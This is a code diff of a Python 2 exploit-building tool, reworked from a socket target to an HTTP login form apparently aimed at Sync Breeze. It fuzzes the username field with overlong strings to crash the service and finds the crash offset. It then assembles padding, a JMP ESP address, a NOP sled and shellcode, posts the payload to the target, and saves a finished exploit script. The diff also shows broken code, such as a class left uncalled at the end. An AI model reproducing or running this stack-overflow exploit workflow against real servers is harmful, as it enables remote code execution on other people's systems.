@@ -2,14 +2,16 @@
 
 
 import random
-import string
-import socket 
+import string 
 import time
 import fileinput
 from Banner import *
 import shutil
+import readline
+import requests
 import os
 import sys
+
 
 W='\033[0m'     
 R='\033[31m'    
@@ -17,31 +19,31 @@ G='\033[0;32m'
 O='\33[37m'     
 B='\033[34m'    
 P= '\033[35m'   
-Y="\033[1;33m" 
-  
+Y="\033[1;33m"   
 
-
-class SERVERSOCKET():
-     
+class HTTPLOGIN():
+    
      def __init__(self):
+           
             global W
             global R
             global G
             global O
             global B
             global P
-            global Y          
-            time.sleep(2)
+            global Y  
             with open('shell_code.py','w') as shell_code:
-                shell_code.write('# pls add your shellcode '+'\n'+'shell_code =()') 	
+                 shell_code.write('# pls add your shellcode '+'\n'+'shell_code =()')  
             mode = """
             ========================                          
-             Target Server Socket
+               Target Http Login
             ========================
-           """
-            print P+mode+W
-            self.app_name = str(raw_input(O+"\n[+]"+W+B+"[*] application name : "+W))
-            self.ip_port()
+            """
+            print O+mode+W      
+            time.sleep(2)
+            print Y+"\n[A]"+W+P+"* use url as 'https/http://' login page/ * "+W+Y+"[C]"+W
+            time.sleep(2)
+            self.web_req()
             self.Fuzzing__()
             self.string_ramdon()
             self.connect_servser()
@@ -51,21 +53,29 @@ class SERVERSOCKET():
             self.little_endian()        
             self.attack_all()
             self.auto_write()
-           
-     def ip_port(self):
+     def web_req(self):
             try:
-                self.server_ip=str(raw_input(O+"\n[+]"+W+B+"Server Ip : "+W))
-                time.sleep(2)
-                self.server_port=int(raw_input(O+"\n[+]"+W+B+"Server Port :"+W)) 
+                self.app_name = str(raw_input(O+"\n[+]"+W+B+"[*] application name : "+W))
+            	session = requests.session()
+                self.target_url=str(raw_input(O+"\n[+]"+W+B+"Target Url : "+W))
+                if '/'in self.target_url[-1]:
+                    pass
+                else:
+                   self.target_url =self.target_url+'/'.strip() 
+                response = session.get(self.target_url,timeout=5)                     
+                if response.ok == True:
+                     pass
             except Exception:
-                print Y+"\n[#]"+W+R+"Please Check Ip and the Port" +W+Y+"[#]"+W 
-                return  self.ip_port()    
+                print Y+"\n[#]"+W+R+"Please Check Service" +W+Y+"[#]"+W
+                time.sleep(2)
+                print Y+"\n[#]"+W+R+"Service Not Runing" +W+Y+"[#]"+W 
+                return  self.web_req()    
             except KeyboardInterrupt:
                 print Banner
                 exit()
-                				
+    
      def Fuzzing__(self):       				
-          try:                  
+          try:                
                 self.Fuz_skip = 's'.lower() 
                 self.Fuz_OPt  = "y".lower()  
                 time.sleep(2)           
@@ -76,68 +86,68 @@ class SERVERSOCKET():
                      pass
                 
                 elif self.Fuzzing_in ==self.Fuz_OPt and len(self.Fuzzing_in)==1:
+                    session = requests.session()
                     String = "A"
-		    Fuzzer = 100
-		    print O+"\n>>>>"+W+R+"Fuzzing in process "+W 		    
-		    try:
-		          try:
-		              while True: 
-		                    Fuzzing_sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-			            Fuzzing_sock.settimeout(2)
-				    Fuzzing_sock.connect((self.server_ip,self.server_port))
-				    Fuzzing_sock.recv(1023)	       	      
-				    Buffer=String*Fuzzer
-				    Fuzzing_sock.send(Buffer+'\n\r')
-				    time.sleep(1)
-				    Fuzzing_sock.close()
-				    length=(int(len(Buffer)))
-				    Fuzzer +=100
-				    print B+"###--> "+W,Fuzzer-100   
-                                    sys.stdout.write('\x1b[1A')
-                                    sys.stdout.write('\x1b[2K')
-			  except:
-		             if  Fuzzer > 100:                           
-                                 print O+"\n>>>>>"+W+P+"Fuzzing Stop at " +W+Y+str(length)+W+ R+ " Characters"+W 
+                    Fuzzer = 100
+                    password = 'admin'
+                    print O+"\n>>>>"+W+R+"Fuzzing in process "+W 
+                    try:
+                        try:
+                            while True: 
+                                 data={ 
+                                 'username': '{}'.format(String*Fuzzer),
+                                 'password':'{}'.format(password),
+                                 'user-agent':'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0'
+                                 }
+                                 response = session.post(self.target_url,data=data,timeout=3)
+                                 Fuzzer  +=100
+                                 time.sleep(1)
+                                 print B+"###--> "+W,Fuzzer   
+                                 sys.stdout.write('\x1b[1A')
+                                 sys.stdout.write('\x1b[2K') 
+                                                         
+                        except requests.exceptions.ConnectionError:
+                          pass
+                        except requests.exceptions.ReadTimeout:
+                             if  Fuzzer > 100:                           
+                                 print O+"\n>>>>>"+W+P+"Fuzzing Stop at " +W+Y+str(Fuzzer)+W+ R+ " Characters"+W 
                              else:
                                print Y+"\n[+]"+W+R+"String Pattern NOT Generated "+W 
                                time.sleep(1)
                                print Y+"\n[+]"+W+B+"service is down "+W 
                                time.sleep(1)
-                               self.ip_port()
-                               self.Fuzzing__()  
-		    except NameError:
-                             print O+"\n***_***_"+W+R+"[::"+W+Y+"Fuzzing NOT Start"+W+R+"::'Connection Error :::::']"+W+O+"***_***"+W
-                             try:
-			       self.ip_port()
-			       self.Fuzzing__()
-			     except:
-			          self.string_ramdon()
-			          	
-	            try:
-                        input= raw_input(O+"\n[]>>>>>>"+W+R+"Please Restart the Application then Press any key to Continue"+W+O+"<<<<<<<[]"+W)
+                               self.web_req()
+                               self.Fuzzing__()
+                    except KeyboardInterrupt:
+                        print  Banner
+                        exit() 
+
+                    try:
+                        input= raw_input(O+"\n[]>>>>>>"+W+R+"Please Restart the Application then Press Enter to Continue"+W+O+"<<<<<<<[]"+W)
                     except NameError:
-                           pass	                                          
-                    self.Random_String = "".join(random.choice(string.ascii_letters)for i in range(int(length) )).lower()  
+                           pass	                                                        
+                    self.Random_String = "".join(random.choice(string.ascii_letters)for i in range(int(Fuzzer))).lower()  
                     self.Random_String = bytearray(self.Random_String)
                     time.sleep(2)
-		    print Y+"\n[+]"+W+R+"String Pattern is Generated in length :"+W,len(self.Random_String )#,"\n\n",(self.Random_String).strip()
+                    print Y+"\n[+]"+W+R+"String Pattern is Generated in length :"+W,len(self.Random_String )#,"\n\n",(self.Random_String).strip()
                     time.sleep(2)  
                     if self.Random_String  > 0:
                            self.connect_servser() 
                            self.Option_return()
-                           self._hexadecimal()
-                           self.import_char() 
+                           self._hexadecimal() 
+                           self.import_char()
                            self.little_endian()        
                            self.attack_all()
-                           self.auto_write()  
-                                                                                                                                                                                     	                    
-	        else:         
-	           time.sleep(2)    
+                           self.auto_write()   
+                                                                                                                                                                          
+                else:         
+                   time.sleep(2)    
                    print Y+"\n[-]"+W+R+"please Enter "+W+B+"'Y'"+W+R+"or"+W+B+"'S'"+W+Y+" [-]"+W 
                    return self.Fuzzing__()             
           except KeyboardInterrupt:
                     print  Banner
                     exit()
+                   
      def string_ramdon(self):        
              try:                      
 	 	    Requst_String = int (raw_input(O+"\n[+]"+W+B+"Enter the length of Pattern :"+W))
@@ -154,31 +164,39 @@ class SERVERSOCKET():
                     exit()                 		 
  
      def connect_servser(self):
-       
-          while True:
-	       try:
-	            socket_1= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-		    socket_1.connect((self.server_ip,self.server_port))
-		    socket_1.settimeout(3)
-		    data = socket_1.recv(1023)
-		    if socket_1.send( self.Random_String +'\r\n'):
-		       time.sleep(2)
-	      	       print Y+"\n[+]"+W+R+"Data Send Successful"+W+Y+"...!!!"+W
-		       socket_1.close()
-		       break 
-	            else:
-	                  print Y+"\n[(!)]"+W+R+" Connection is Down Socket.Error"+W+Y+"[(!)]"+W
-	                  time.sleep(2)
-	                  return self.ip_port()
-	       except socket.error, exc:
-	            print O+"\n***_***_"+W+R+"[:::::'Connection Error :::::']"+W+O+"+***_***"+W
-	            time.sleep(2)
-	            print O+"\n[(!)]"+W+Y+"Connection is Down >> Exception Socket.Error "+W+O+" :"+W +R+"%s\n" %exc+W
-		    self.ip_port()
-		    continue
-               except KeyboardInterrupt:
-                    print  Banner
-                    exit()
+        try:
+            try:
+               session = requests.session()
+               response = session.get(self.target_url,timeout=5)
+               if response.ok == True:
+     	          while True:
+                    try:
+                       session = requests.session()
+                       password = 'admin' 
+                       data={ 
+                       'username': '{}'.format(self.Random_String),
+                       'password':'{}'.format(password),
+                       'user-agent':'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0'
+                       }
+                       response = session.post(self.target_url,data=data,timeout=3)
+                          
+                    except :
+                 	   print Y+"\n[+]"+W+R+"Data Send Successful"+W+Y+"...!!!"+W
+                 	   time.sleep(2)
+                 	   print Y+"\n[+]"+W+R+"please Restart The Service"+W+Y+"...!!!"+W
+                 	   break
+               else:
+                   print O+"\n***_***_"+W+R+"[:::::'Connection Error :::::']"+W+O+"+***_***"+W 
+                   print Y+"\n[+]"+W+R+"please Restart The Service and try agin"+W+Y+"...!!!"+W  	   
+                   self.connect_servser()
+            except requests.exceptions.ReadTimeout:
+                print O+"\n***_***_"+W+R+"[:::::'Connection Error :::::']"+W+O+"+***_***"+W 
+                print Y+"\n[+]"+W+P+"please Restart The Service and try agin"+W+Y+"...!!!"+W 
+                self.Fuzzing__()
+                self.connect_servser()
+        except KeyboardInterrupt:
+            print  Banner
+            exit()
      def Option_return(self):
        
            try:
@@ -199,10 +217,10 @@ class SERVERSOCKET():
                    print  Banner
                    exit()
                                
-     def _hexadecimal(self):                                                                                    
-            while True:
-                 try:
-                                        
+     def _hexadecimal(self):
+                                                                                   
+          while True:
+                 try: 
 		    self.hexadecimal =str(raw_input(O+"\n[+]"+W+B+"Enter Hexadecimal Crach address: "+W)).upper()
                     self.ASCII1 ="".join(reversed([self.hexadecimal[i:i+2] for i in range(0, len(self.hexadecimal), 2)]))                
 		    self.ASCII = ''.join(chr(int(self.ASCII1[i:i+2], 16)) for i in range(0, len(self.ASCII1), 2))
@@ -213,7 +231,6 @@ class SERVERSOCKET():
 		       self.location = self.Random_String.find(self.ASCII)		       
 		       print Y+"\n[+]"+W+P+"Exact Satch at Offset"+W+B+" : "+W,self.location	              
                        break
-                             
 		    else:
 	               print Y+"\n[(*)]"+W+R+"THE VALUE  OF THE ADDRESS Not FOUND  IN OUR STRING"+W+Y+"[(*)] "+W
 	               time.sleep(2)
@@ -226,7 +243,7 @@ class SERVERSOCKET():
 	        
                  except KeyboardInterrupt:
                        print  Banner
-                       exit()
+                       exit() 
      def import_char(self): 
          try:
             
@@ -239,30 +256,32 @@ class SERVERSOCKET():
                     ========================                          
                       Bad_Character start
                     ========================\n 
-                    """
+                     """
                 print B+banner+W 
                 with open('.data','w')as data :
-                    data1 = data.write(self.server_ip+'\n'+str(self.server_port)+'\n'+str(self.location))         
+                    data1 = data.write(self.target_url+'\n'+str(self.location))                             
                 time.sleep(2)
-                from Bad_Character import Bad_Character             
-                run = Bad_Character()
+                from Bad_Character import Bad_Character_SyncBreeze             
+                run = Bad_Character_SyncBreeze()
             elif bad_op ==Bad_no and len(Bad_no)==2: 
-		print R+"\n\t\t!___To Continue Exploit Generate shellcode and post it in shell_code.py file___! \n"+W 
+                print R+"\n\t\t!___To Continue Explit Generate shellcode and post it in shell_code.py file___! \n"+W 
                 pass
             else:
               print Y+"\n[-]"+W+R+"Please Enter "+W+B+"yes"+W+R+" or"+W+B+" no"+W+Y+" [-]"+W 
               self.import_char()                   
          except KeyboardInterrupt:
                 print  Banner
-                exit()                   
-     def little_endian(self):       
+                exit()                                  
+         
+     def little_endian(self):
+         
                try:
                     jump= str(raw_input(O+"\n[+]"+W+B+" Enter JMP ESP addrsss HEX  : "+W)).upper()
                     if len(jump) < 4 :
                         print Y+"\n[(*)]"+W+R+"JMP ESP is Required "+W+Y+"[(*)] "+W  
 	                return self.little_endian()  
 	            else:
-	               pass             
+	               pass                         
                     time.sleep(2)
                     self.jump_address = "".join(reversed([jump[i:i+2] for i in range(0, len(jump), 2)]))
                     self.display =self.jump_address# for print olnly
@@ -279,81 +298,90 @@ class SERVERSOCKET():
                     exit()
                                 
      def attack_all(self):
-	       from shell_code import shell_code   		       
-	       try: 	                      
-                   socket_2 =socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+       
+	       from shell_code import shell_code  
+	       if len(shell_code) < 50:
+                     print P+"\n\t\t\t\t!__________________EXPLOIT__Fail__________________!"+W
+                     print B+"\n\t\t\t!__________________Dedicated_No_Shell_Code______________________!"+W
+                     exit()
+               else:
+                   pass          
+	       try:	                     
                    Start_string = self.location*"A"        
                    self.NO_Operation = len(self.Random_String) - self.location  - len( self.jump_address)
                    self.NO_Operation =self.NO_Operation*"\x90"
                    self.count = self.NO_Operation.count("\x90")    
-                   attack = Start_string+self.jump_address+ self.NO_Operation +str(shell_code)
+                   attack = Start_string+self.jump_address+ self.NO_Operation + str(shell_code) 
                    time.sleep(2)
                    print Y+'\n[+]'+W+B+' attack'+W+O+' ='+W,len(Start_string),B+'of'+W+R+ " A "+W+O+' + '+W+B+\
-                   ' JMP ESP ='+W,Y+ self.display+W ,O+'+'+W,self.NO_Operation.count("\x90"),B+'of'+W+R+'("\\x90")'+W+O +'+'+W+P+' shell code'+W
+                   ' JMP ESP ='+W,Y+ self.display+W ,O+'+'+W,self.NO_Operation.count("\x90"),B+'of'+W+R+'("\\x90")'+W+O +'+'+W+P+' shell_code'+W
                    time.sleep(2)
-                   print Y+"\n[+]"+W+R+"Conncet Server Ip "+W+O+ " : "+W, P+self.server_ip+W
+                   print Y+"\n[+]"+W+R+"Target URL "+W+O+ " : "+W, P+self.target_url+W
                    time.sleep(2)
-                   print Y+"\n[+]"+W+R+"Conncet Server Port "+W+O+"  : "+W, self.server_port
-                   socket_2.settimeout(8)  
-                   socket_2.connect((self.server_ip,self.server_port))      
-                   time.sleep(2) 
-                   self.data_recv  = socket_2.recv(1024)
-                   if socket_2.send( attack + '\r\n'):                        
-                         if len(shell_code) < 50:
-                                 print P+"\n\t\t\t\t!__________________EXPLOIT__Fail__________________!"+W
-                                 print B+"\n\t\t\t!__________________Dedicated  No Shell Code______________________!"+W
-                                 exit()
-                         print B +"\n[+]"+W+R+"WE READY TO ATTACK !!"+W+B+"[+]"+W 
-                         time.sleep(2)     
-                         print R+"\n\t\t\t!__________________EXPLOIT__SACUSSED__________________!"+W 
-                         socket_2.close()
-               except socket.error, exc :                        
-                         print O+"\n***_***_"+W+R+"[:::::'Connection Error :::::']"+W+O+"+***_***"+W
-                         time.sleep(2)
-                         print R+"\n::::::The Connection Down Please  Check FTP_SERVER NOT ONLINE :::: "+W         
-                         time.sleep(2)  
-                         self.little_endian()        
-                         self.attack_all()
+                   try:
+                      session = requests.session()
+                      response = session.get(self.target_url,timeout=5)
+                      if response.ok == True:                  
+                         try:
+                            while True:
+                              session = requests.session()
+                              password = 'admin' 
+                              data={ 
+                              'username': '{}'.format(attack),
+                              'password':'{}'.format(password),
+                              'user-agent':'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0'
+                              }
+                              response = requests.post(self.target_url,data=data,timeout=3) 
+                                          
+                         except Exception :
+                             print B +"\n[+]"+W+R+"WE READY TO ATTACK !!"+W+B+"[+]"+W 
+                             time.sleep(2)
+                             print R+"\n\t\t\t!__________________EXPLOIT__SACUSSED__________________!"+W 
+                   except Exception : 
+                       print O+"\n[(!)]"+W+Y+"Connection is Down >> requests.exceptions.ConnectionError"+W 
+                       self.little_endian()
+                       self.attack_all()               
                except KeyboardInterrupt:
                    print  Banner
                    exit()  
                    
      def auto_write(self): 
-	        from shell_code import shell_code      	     
+                from shell_code import shell_code 
                 try:                
                   shell =str(shell_code).encode("hex")
                   shell1= "".join("\\x%s"%shell[i:i+2] for i in range(0, len(shell), 2))
                   self.shell_code= "".join('\n"%s"'%shell1[i:i+56] for i in range(0, len(shell1),56))
-                  copy_format= shutil.copy("./TemplateExploit/payload1.txt",'./ExploitStore/'+self.app_name+"_Exploit.py")
+                  copy_format= shutil.copy("./TemplateExploit/payload3.txt",'./ExploitStore/'+self.app_name+"_Exploit.py") 
                      
                   file= './ExploitStore/'+self.app_name+"_Exploit.py"
                   for line in fileinput.FileInput(file,inplace=1):
 	                if '# application name :'in line:
 		            line = line.rstrip()
-		            line = line.replace(line,line+ self.app_name +'\n')				 
+		            line = line.replace(line,line+ 'Sync Breeze' +'\n')
+				 
 	                if '_Offset_Byte  =  "A"*'in line:
 		            line = line.rstrip()
-		            line = line.replace(line,line+ str(self.location)+'\n')				 
+		            line = line.replace(line,line+ str(self.location)+'\n')
+				 
 		        if '_JMP_ESP      ='in line:
 		            line = line.rstrip()
-		            line = line.replace(line,line+'"'+ self.display+'"'+'\n')				 
+		            line = line.replace(line,line+'"'+ self.display+'"'+'\n')
+				 
 	                if '_NO_OPT       = "\\x90"'in line:
 		            line = line.rstrip()
 		            line = line.replace(line,line+ str(self.count) +'\n')
 		        if '_Shell_Code   = ('in line:
 		             line = line.rstrip()
-		             line = line.replace(line,line+ self.shell_code+ ')'+'\n')			     
-		        if 'ip_address ='in line:
+		             line = line.replace(line,line+ self.shell_code+ ')'+'\n') 
+			     
+		        if 'Target_Url ='in line:
 		            line = line.rstrip()
-			    line = line.replace(line,line+'"'+self.server_ip+'"'+"\n")				 
-		        if 'connect_Port ='in line:
-		            line = line.rstrip()
-		            line = line.replace(line,line+ str(self.server_port)+'\n')  
+			    line = line.replace(line,line+'"'+self.target_url+'"'+"\n") 
 					   
 		        print line,
 		        
-                  time.sleep(2)		
-		  print O+"\n\t!_________The Final Process of this Exploit Written in to "+W,Y+"'ExploitStore'"+W,O+"Folder________!"+W
+                  time.sleep(2)
+		  print O+"\n\t!_________The Final Process of this Exploit Written in to "+W,Y+"'ExploitStore'"+W,O+"Folder________!"+W 
 		  time.sleep(2)     
                   print   Banner
                   exit() 
@@ -363,4 +391,4 @@ class SERVERSOCKET():
 
 		          
 if __name__ == '__main__':
-   SERVERSOCKET()
+   HTTPLOGIN
